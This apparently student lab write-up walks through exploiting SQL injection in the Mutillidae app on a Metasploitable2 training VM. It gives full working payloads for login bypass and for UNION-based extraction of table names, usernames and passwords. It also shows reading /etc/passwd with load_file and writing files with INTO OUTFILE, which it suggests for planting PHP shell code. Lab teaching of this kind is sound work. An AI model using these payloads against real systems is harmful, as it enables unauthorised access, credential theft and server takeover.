# sqlinjection
Exploiting SQL Injection vulnerability
# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2
## DESIGN STEPS:
### Step 1:
Install kali linux either in partition or virtual box or in live mode
### Step 2:
Investigate on the various categories of tools as follows:
### Step 3:
Open terminal and try execute some kali linux commands
## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2 

![326167489-91d38cf4-7261-4878-9c71-1724992006ed](https://github.com/Naveenaa28/sqlinjection/assets/131433133/e5b31806-4c05-428c-b1c3-fa12c241d7ed)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 325657622-28300288-17b2-4d70-b1d6-3ee0a018feac
![326167524-baea06ec-f598-4e58-8971-9075a635be44](https://github.com/Naveenaa28/sqlinjection/assets/131433133/0758f1dc-f1fd-4555-a65d-dbff167059c7)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![326167543-7eb6f9e6-bf60-4bcd-880c-b0ee52169c99](https://github.com/Naveenaa28/sqlinjection/assets/131433133/216f5fc9-df4d-4524-8d86-c1392d02eca7)
Click on the menu Login/Register and register for an account

![326167552-5e50537d-a76a-4c01-abce-7b748fc8f6ca](https://github.com/Naveenaa28/sqlinjection/assets/131433133/667ef8f7-a266-49b9-a0b8-ba441caeaa32)
Click on the link “Please register here”

![326167640-4c275f89-7aed-4a8d-a982-f06197f2ba5d](https://github.com/Naveenaa28/sqlinjection/assets/131433133/c47b859f-c18a-4a42-8b17-0d94500800d3)
Click on “Create Account” to display the following page

![326167656-090badfa-881b-4c42-b4e5-4e0c037aedd1-1](https://github.com/Naveenaa28/sqlinjection/assets/131433133/82380fb6-c5e0-4285-a25e-e4c35b91ba02)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![326167675-e9bd9257-5df2-4d1b-9448-d29e0c6a413c](https://github.com/Naveenaa28/sqlinjection/assets/131433133/958f2006-777f-4b77-9599-ef3a8427a553)
Click “Login”. The logged in page will show as below: 

![326167689-a0b9be05-0d47-4e5f-a85e-171803756883](https://github.com/Naveenaa28/sqlinjection/assets/131433133/17442e8a-70ba-4bb4-8c9e-24d05f5c4533)
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![326167705-a4b597c5-733a-4a79-be07-08db50834432](https://github.com/Naveenaa28/sqlinjection/assets/131433133/241628d1-cd8c-4523-a192-01c8844a164e)
Click the login button and you will see it enter into the administrator page. 325658372-b7b5d131-fcc9-4084-8173-4cb7fe583f0b

![326167715-c53ed745-89e2-4ea2-bc4f-b99bcff1a7cf](https://github.com/Naveenaa28/sqlinjection/assets/131433133/7e426ed0-9caa-4be5-a31c-d92c8f3788d3)
### Union-based SQL injection:
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below

![326167742-ed692090-a94d-4649-91f7-832557d6c24a](https://github.com/Naveenaa28/sqlinjection/assets/131433133/90507cce-29fb-457f-9a3d-9785c2caa435)

![326167746-f4a9d297-0723-48d3-85ef-29ed77f38824](https://github.com/Naveenaa28/sqlinjection/assets/131433133/27d41dc9-a01b-4180-80a3-94062401efe3)

![326167754-69e12e90-e470-46e2-b5f7-0023c4ad590d](https://github.com/Naveenaa28/sqlinjection/assets/131433133/8ed9379b-6dba-4880-b3be-e2e036a68891)


![326167767-b6ccf61d-4fa8-4b31-b0b7-8305c7599ef7](https://github.com/Naveenaa28/sqlinjection/assets/131433133/09e85649-14f7-40c1-992f-68b7a1f64289)

![326167772-01523eee-2a66-4776-8cb2-366f1d77fafb](https://github.com/Naveenaa28/sqlinjection/assets/131433133/4ee2e65d-e57b-405b-ad8e-5630b1338620)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![326167782-cd807a3d-4a16-47a0-9bc0-95578dad990c](https://github.com/Naveenaa28/sqlinjection/assets/131433133/db45239d-dadf-44b9-8be9-d87e5b183d61)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6. The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![326167798-af01eef3-148b-4a93-94e7-94b815bd7340](https://github.com/Naveenaa28/sqlinjection/assets/131433133/d0673583-282b-4296-9725-fc3239aa9f39)
After adding the order by 6 into the existing url , the following error statement will be obtained: 325659955-4c68e9ec-cb59-44dc-8a1f-3e56b3af0041

![326167807-92c6eaae-156f-4d7b-adf8-268c47e5d09f](https://github.com/Naveenaa28/sqlinjection/assets/131433133/3451293b-24ed-4352-928b-6bdadd3607f0)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![326167825-5e28b185-ba4f-4ca6-8d3e-c5eafa1105a7](https://github.com/Naveenaa28/sqlinjection/assets/131433133/75ae6e7d-53f1-4dd0-94f8-87200e921100)
As it is having 5 columns the query worked fine and it provides the correct result

![326167844-1c131d98-1b5f-4221-9e19-c567aab00d8d](https://github.com/Naveenaa28/sqlinjection/assets/131433133/57374a77-b42f-40fb-83f4-f26810998631)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5) 

![326167852-d6df498b-cd3d-4b30-b7f4-5eae6f23467b](https://github.com/Naveenaa28/sqlinjection/assets/131433133/421b150c-7eca-4679-93a9-10d1ae6a9def)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![326167909-23e4c2ee-c204-4658-9c78-2c7b082584be](https://github.com/Naveenaa28/sqlinjection/assets/131433133/f4c9dcdd-dd6e-441f-865c-d10a8f357518)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![326167946-70faccc5-468e-4ea6-8124-fda9ceace43a](https://github.com/Naveenaa28/sqlinjection/assets/131433133/35d3d60d-493b-4b1a-93f2-961f05380f8c)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![326167967-6decfa12-727f-4450-b3dd-1f379b8c7b3b](https://github.com/Naveenaa28/sqlinjection/assets/131433133/29a94398-e2be-4f7b-878e-3ffb7c3189c7)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![326167986-8413565a-6e8d-4682-a66f-71d7215adf58](https://github.com/Naveenaa28/sqlinjection/assets/131433133/0998fb64-e2b1-459c-bdf7-d6f41830dc93)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![326168007-876c9aed-a000-4bf0-afe4-20b9ef109227](https://github.com/Naveenaa28/sqlinjection/assets/131433133/b19dcdb9-36a6-4901-836a-096d97a9b1d6)
### Reading and writing files on the web-server:
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![326168036-f6ac4e0c-3bd2-4331-9c17-ed2df2c37732](https://github.com/Naveenaa28/sqlinjection/assets/131433133/af0567cf-32f0-4fd8-9db7-aa6936fb578d)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
